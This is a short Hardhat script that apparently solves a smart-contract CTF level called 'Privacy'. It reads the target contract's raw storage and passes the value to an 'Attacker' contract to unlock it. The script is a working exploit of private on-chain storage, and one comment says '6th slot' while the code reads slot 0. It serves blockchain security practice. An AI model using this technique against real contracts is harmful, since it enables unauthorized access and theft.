import { ethers } from "hardhat";
import { wrapEthersProvider } from "hardhat-tracer";
const CONTRACT_ADDRESS = "0xbae24653124CA68cEd2A23C395100d9250edA62A";
const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
const ATTACKER_CONTRACT = "0x2681D56626713Bc4b7Fb929599D2634d5fe22F87";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const contract = await ethers.getContractAt(
    "Privacy",
    CONTRACT_ADDRESS,
    signer
  );

  //test
  // const attackerContractFactory = await ethers.getContractFactory(
  //   "Attacker",
  //   signer
  // );

  // const attackerContract = await attackerContractFactory.deploy();

  // console.log(attackerContract);

  const attackerContract = await ethers.getContractAt(
    "Attacker",
    ATTACKER_CONTRACT,
    signer
  );

  // Step 1 - retrieve the data of the privacy contract at the 6th slot
  const data = await ethers.provider.getStorageAt(CONTRACT_ADDRESS, 0);
  console.log("The data at storage slot 0 is ", data);
  // Step 2 pass this data to the attacker contract proxy unlock function
  const callProxyUnlock = await attackerContract.proxyUnlock(data);
  console.log(callProxyUnlock);
  // step3 call the lock function to see if it is false
  console.log(
    "The contract will return false if unlocked",
    await contract.locked()
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
